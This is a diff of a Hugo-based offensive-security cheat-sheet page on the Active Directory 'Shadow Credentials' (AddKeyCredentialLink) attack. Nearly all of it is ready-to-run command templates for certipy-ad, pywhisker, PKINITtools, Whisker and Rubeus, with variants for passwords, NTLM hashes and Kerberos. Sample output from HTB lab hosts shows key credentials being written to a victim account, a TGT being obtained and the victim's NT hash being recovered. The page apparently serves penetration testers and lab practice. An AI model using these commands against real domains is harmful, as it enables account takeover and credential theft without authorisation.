@@ -1,131 +1,158 @@
 ---
 title: "AddKeyCredentialLink"
-tags: ["Shadow Credentials", "Pass-The-Cert", "AddkeyCredentialLink", "Active Directory", "Windows", "Whisker", "Pywhisker"]
+tags: ["Active Directory", "AddKeyCredentialLink", "AddkeyCredentialLink", "Pass-The-Cert", "Pywhisker", "Shadow Credentials", "Whisker", "Windows"]
 ---
 
-### Privesc #1: Shadow Credential (From Linux)
+{{< filter_buttons >}}
 
-{{< tab set1 tab1 >}}pywhisker{{< /tab >}}
-{{< tab set1 tab2 >}}certipy-ad{{< /tab >}}
+### Shadow Credential
+
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
+{{< tab set1-1 tab1 active >}}certipy-ad{{< /tab >}}{{< tab set1-1 tab2 >}}pywhisker{{< /tab >}}
+{{< tabcontent set1-1 tab1 >}}
 
-#### 0. Pre-Check \[Optional\]
-
-```console
+```console {class="password"}
 # Password
-python3 pywhisker.py -t '<TARGET_USER>' --action list -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> --use-ldaps
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -p <PASSWORD> -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
-$ python3 pywhisker.py --action list -d outdated.htb -u 'btables' -p '5myBPLPDKT3Bfq' --dc-ip 10.10.11.175 -t 'sflowers' --use-ldaps
-[*] Searching for the target account
-[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
-[*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute
-```
+$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -p 'Password123!' -account edward.martin -target DC01.haze.htb -dc-ip 10.129.232.50
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
-```console
-# NTLM
-python3 pywhisker.py -t '<TARGET_USER>' --action list -d <DOMAIN> -u '<USER>' -H '<HASH>' --dc-ip <DC_IP> --use-ldaps
-```
-
-#### 1. Add Shadow Credentials
-
-```console
-# Password
-python3 pywhisker.py --action add -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> -t '<TARGET_USER>' --use-ldaps
-```
-
-```console {class="sample-code"}
-$ python3 pywhisker.py --action add -d outdated.htb -u 'btables' -p '5myBPLPDKT3Bfq' --dc-ip 10.10.11.175 -t 'sflowers' --use-ldaps
-[*] Searching for the target account
-[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+[*] Targeting user 'edward.martin'
 [*] Generating certificate
 [*] Certificate generated
-[*] Generating KeyCredential
-[*] KeyCredential generated with DeviceID: 3c90e8fb-0405-f373-5424-32d34084ccce
-[*] Updating the msDS-KeyCredentialLink attribute of sflowers
-[+] Updated the msDS-KeyCredentialLink attribute of the target object
-[+] Saved PFX (#PKCS12) certificate & key at path: 3p24aKIn.pfx
-[*] Must be used with password: qFhAIiIMg5ys4SQYYOst
-[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '27690c0aa0d54edaa91a2abc456f98a0'
+[*] Adding Key Credential with device ID '27690c0aa0d54edaa91a2abc456f98a0' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID '27690c0aa0d54edaa91a2abc456f98a0' to the Key Credentials for 'edward.martin'
+[*] Authenticating as 'edward.martin' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'edward.martin@haze.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'edward.martin.ccache'
+File 'edward.martin.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'edward.martin.ccache'
+[*] Trying to retrieve NT hash for 'edward.martin'
+[*] Restoring the old Key Credentials for 'edward.martin'
+[*] Successfully restored the old Key Credentials for 'edward.martin'
+[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
 ```
 
-```console
-# NTLM
-python3 pywhisker.py --action add -d <DOMAIN> -u '<USER>' -H '<HASH>' --dc-ip <DC_IP> -t '<TARGET_USER>' --use-ldaps
-```
-
-<br>
-
-```console
-# Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type'
-pip3 install -I pyopenssl==24.0.0
-```
-
-#### 2. Request a TGT Using the PFX
-
-```console
-sudo ntpdate -s <DC_IP> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<GENERATED_PASSWORD>' '<DOMAIN>/<TARGET_USER>' '<TARGET_USER>.ccache' -dc-ip <DC>
-```
-
-```console {class="sample-code"}
-$ sudo ntpdate -s 10.10.11.175 && python3 gettgtpkinit.py -cert-pfx 3p24aKIn.pfx -pfx-pass 'qFhAIiIMg5ys4SQYYOst' 'outdated.htb/sflowers' sflowers.ccache -dc-ip 10.10.11.175
-
-2024-09-23 01:48:14,567 minikerberos INFO     Loading certificate and key from file
-INFO:minikerberos:Loading certificate and key from file
-2024-09-23 01:48:14,578 minikerberos INFO     Requesting TGT
-INFO:minikerberos:Requesting TGT
-2024-09-23 01:48:38,986 minikerberos INFO     AS-REP encryption key (you might need this later):
-INFO:minikerberos:AS-REP encryption key (you might need this later):
-2024-09-23 01:48:38,987 minikerberos INFO     a1870bb416f2b965df3df681288f3b272119d86288c67c572675b80ea1bedd94
-INFO:minikerberos:a1870bb416f2b965df3df681288f3b272119d86288c67c572675b80ea1bedd94
-2024-09-23 01:48:38,990 minikerberos INFO     Saved TGT to file
-INFO:minikerberos:Saved TGT to file
-```
-
-#### 3. Get NT Hash
-
-```console
-export KRB5CCNAME=<TARGET_USER>.ccache
-```
-
-```console
-python3 getnthash.py '<DOMAIN>/<TARGET_USER>' -key <AS_REP_ENC_KEY>
-```
-
-```console {class="sample-code"}
-$ python3 getnthash.py 'outdated.htb/sflowers' -key a1870bb416f2b965df3df681288f3b272119d86288c67c572675b80ea1bedd94
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Using TGT from cache
-[*] Requesting ticket to self with PAC
-Recovered NT Hash
-1fcdb1f6015dcb318cc77bb2bda14db5
-```
-
-<small>*Ref: [pywhisker](https://github.com/ShutdownRepo/pywhisker)*</small>
-<br>
-<small>*Ref: [PKINITtools](https://github.com/dirkjanm/PKINITtools)*</small>
-
-{{< /tabcontent >}}
-{{< tabcontent set1 tab2 >}}
-
-```console
+```console {class="ntlm"}
 # NTLM
 certipy-ad shadow auto -username '<USER>@<DOMAIN>' -hashes '<HASH>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
 $ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -hashes '735c02c6b2dc54c3c8c6891f55279ebc' -account edward.martin -target DC01.haze.htb -dc-ip 10.129.232.50
-Certipy v5.0.2 - by Oliver Lyak (ly4k)
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Targeting user 'edward.martin'
 [*] Generating certificate
 [*] Certificate generated
 [*] Generating Key Credential
-[*] Key Credential generated with DeviceID '40c9b346-bbf0-34fa-f9f8-173872388668'
-[*] Adding Key Credential with device ID '40c9b346-bbf0-34fa-f9f8-173872388668' to the Key Credentials for 'edward.martin'
-[*] Successfully added Key Credential with device ID '40c9b346-bbf0-34fa-f9f8-173872388668' to the Key Credentials for 'edward.martin'
+[*] Key Credential generated with DeviceID '27690c0aa0d54edaa91a2abc456f98a0'
+[*] Adding Key Credential with device ID '27690c0aa0d54edaa91a2abc456f98a0' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID '27690c0aa0d54edaa91a2abc456f98a0' to the Key Credentials for 'edward.martin'
+[*] Authenticating as 'edward.martin' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'edward.martin@haze.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'edward.martin.ccache'
+File 'edward.martin.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'edward.martin.ccache'
+[*] Trying to retrieve NT hash for 'edward.martin'
+[*] Restoring the old Key Credentials for 'edward.martin'
+[*] Successfully restored the old Key Credentials for 'edward.martin'
+[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -p <PASSWORD> -k -account <TARGET_USER> -target <DC> -dc-host <DC> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -p 'Password123!' -k -account edward.martin -target DC01.haze.htb -dc-host DC01.haze.htb -dc-ip 10.129.232.50
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
+[*] Targeting user 'edward.martin'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '60ceba8fb2f14695975a2e8eb58e58d8'
+[*] Adding Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
+[*] Authenticating as 'edward.martin' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'edward.martin@haze.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'edward.martin.ccache'
+[*] Wrote credential cache to 'edward.martin.ccache'
+[*] Trying to retrieve NT hash for 'edward.martin'
+[*] Restoring the old Key Credentials for 'edward.martin'
+[*] Successfully restored the old Key Credentials for 'edward.martin'
+[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -hashes '<HASH>' -k -account <TARGET_USER> -target <DC> -dc-host <DC> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -hashes '735c02c6b2dc54c3c8c6891f55279ebc' -k -account edward.martin -target DC01.haze.htb -dc-host DC01.haze.htb -dc-ip 10.129.232.50
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
+[*] Targeting user 'edward.martin'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '60ceba8fb2f14695975a2e8eb58e58d8'
+[*] Adding Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
+[*] Authenticating as 'edward.martin' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'edward.martin@haze.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'edward.martin.ccache'
+[*] Wrote credential cache to 'edward.martin.ccache'
+[*] Trying to retrieve NT hash for 'edward.martin'
+[*] Restoring the old Key Credentials for 'edward.martin'
+[*] Successfully restored the old Key Credentials for 'edward.martin'
+[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -k -account <TARGET_USER> -target <DC> -dc-host <DC> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -k -account edward.martin -target DC01.haze.htb -dc-host DC01.haze.htb -dc-ip 10.129.232.50
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'edward.martin'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '60ceba8fb2f14695975a2e8eb58e58d8'
+[*] Adding Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
 [*] Authenticating as 'edward.martin' with the certificate
 [*] Certificate identities:
 [*]     No identities found in this certificate
@@ -141,25 +168,176 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 ```
 
 {{< /tabcontent >}}
+{{< tabcontent set1-1 tab2 >}}
 
-### Privesc #1: Shadow Credential (From Windows)
+#### 1. Add Shadow Credentials
 
-{{< tab set2 tab1 >}}whisker{{< /tab >}}
-{{< tabcontent set2 tab1 >}}
-
-#### 0. Pre-Check \[Optional\]
-
-```console
-.\whisker.exe list /domain:<DOMAIN> /target:'<TARGET_USER>' /dc:<DC>
+```console {class="password"}
+# Password
+python3 pywhisker.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
 ```
 
 ```console {class="sample-code"}
-PS C:\programdata> .\whisker.exe list /domain:outdated.htb /target:'sflowers' /dc:10.10.11.175
+$ python3 pywhisker.py --action add -d haze.htb -u 'haze-it-backup$' -p 'Password123!' --dc-ip 10.129.232.50 -t 'edward.martin' --use-ldaps
 [*] Searching for the target account
-[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
-[*] Listing deviced for sflowers:
-[*] No entries!
+[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
+[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
+[+] PFX exportiert nach: WYwZ8GQT.pfx
+[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
+[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
+[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 ```
+
+```console {class="ntlm"}
+# NTLM
+python3 pywhisker.py -d <DOMAIN> -u '<USER>' -H '<HASH>' --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
+```
+
+```console {class="sample-code"}
+$ python3 pywhisker.py --action add -d haze.htb -u 'haze-it-backup$' -H '735c02c6b2dc54c3c8c6891f55279ebc' --dc-ip 10.129.232.50 -t 'edward.martin' --use-ldaps
+[*] Searching for the target account
+[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
+[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
+[+] PFX exportiert nach: WYwZ8GQT.pfx
+[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
+[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
+[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+python3 pywhisker.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
+```
+
+```console {class="sample-code"}
+$ python3 pywhisker.py -d haze.htb -u 'haze-it-backup$' -p 'Password123!' -k --dc-ip 10.129.232.50 --action add -t 'edward.martin' --use-ldaps
+[*] Searching for the target account
+[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
+[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
+[+] PFX exportiert nach: WYwZ8GQT.pfx
+[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
+[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
+[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+python3 pywhisker.py -d <DOMAIN> -u '<USER>' -H '<HASH>' -k --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
+```
+
+```console {class="sample-code"}
+$ python3 pywhisker.py -d haze.htb -u 'haze-it-backup$' -H '735c02c6b2dc54c3c8c6891f55279ebc' -k --dc-ip 10.129.232.50 --action add -t 'edward.martin' --use-ldaps
+[*] Searching for the target account
+[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
+[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
+[+] PFX exportiert nach: WYwZ8GQT.pfx
+[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
+[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
+[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+python3 pywhisker.py -d <DOMAIN> -u '<USER>' -k --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
+```
+
+```console {class="sample-code"}
+$ python3 pywhisker.py -d haze.htb -u 'haze-it-backup$' -k --dc-ip 10.129.232.50 --action add -t 'edward.martin' --use-ldaps
+[*] Searching for the target account
+[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
+[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
+[+] PFX exportiert nach: WYwZ8GQT.pfx
+[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
+[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
+[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
+#### 2. Request a Ticket Using the PFX
+
+```console
+python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<GENERATED_PASSWORD>' '<DOMAIN>/<TARGET_USER>' '<TARGET_USER>.ccache' -dc-ip <DC>
+```
+
+```console {class="sample-code"}
+$ python3 gettgtpkinit.py -cert-pfx WYwZ8GQT.pfx -pfx-pass 'k9Z5Q2g87lakxIoE7rd2' 'haze.htb/edward.martin' 'edward.martin.ccache' -dc-ip dc01.haze.htb 
+2025-10-31 20:24:22,412 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-10-31 20:24:22,420 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-10-31 20:24:36,391 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-10-31 20:24:36,391 minikerberos INFO     62414608995ff5382ef6657aad37038beaa512c8e65de94f3302f1771738acd5
+INFO:minikerberos:62414608995ff5382ef6657aad37038beaa512c8e65de94f3302f1771738acd5
+2025-10-31 20:24:36,393 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+```
+
+#### 3. Get NTLM Hash
+
+```console
+# Pass-the-ticket
+export KRB5CCNAME=<TARGET_USER>.ccache
+```
+
+```console
+# Get NTLM hash
+python3 getnthash.py '<DOMAIN>/<TARGET_USER>' -key <AS_REP_ENC_KEY>
+```
+
+```console {class="sample-code"}
+$ python3 getnthash.py 'haze.htb/edward.martin' -key 62414608995ff5382ef6657aad37038beaa512c8e65de94f3302f1771738acd5
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+09e0b3eeb2e7a6b0d419e9ff8f4d91af
+```
+
+<small>*Ref: [pywhisker](https://github.com/ShutdownRepo/pywhisker)*</small>
+<br>
+<small>*Ref: [PKINITtools](https://github.com/dirkjanm/PKINITtools)*</small>
+
+{{< /tabcontent >}}
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+{{< tab set1-2 tab1 active>}}whisker{{< /tab >}}
+{{< tabcontent set1-2 tab1 >}}
 
 #### 1. Add Shadow Credentials
 
@@ -183,7 +361,7 @@ PS C:\programdata> .\whisker.exe add /domain:outdated.htb /target:'sflowers' /dc
 Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAz .---[SNIP]--- TvhwICB9A= /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
 ```
 
-#### 2. Request a TGT Using the PFX File and Get NTLM Hash
+#### 2. Request a Ticket Using the PFX File and Get NTLM Hash
 
 ```console
 .\rubeus.exe asktgt /user:'<TARGET_USER>' /certificate:'<BASE64_PFX>' /password:'<PFX_PASSWORD>' /domain:<DOMAIN> /dc:<DC> /getcredentials /show
@@ -235,5 +413,5 @@ PS C:\programdata> .\Rubeus.exe asktgt /user:sflowers /certificate:'MIIJuAIBAz .
 
 <small>*Ref: [Whisker.exe](https://github.com/eladshamir/Whisker)*</small>
 
-
+{{< /tabcontent >}}
 {{< /tabcontent >}}
